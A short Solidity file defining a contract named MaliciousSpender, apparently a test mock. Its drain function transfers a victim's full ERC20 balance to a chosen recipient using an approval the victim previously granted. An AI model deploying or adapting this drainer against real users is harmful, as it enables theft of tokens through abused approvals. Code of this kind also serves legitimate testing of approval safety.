// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract MaliciousSpender {
    using SafeERC20 for IERC20;

    function drain(IERC20 token, address victim, address recipient) external {
        token.safeTransferFrom(victim, recipient, token.balanceOf(victim));
    }
}
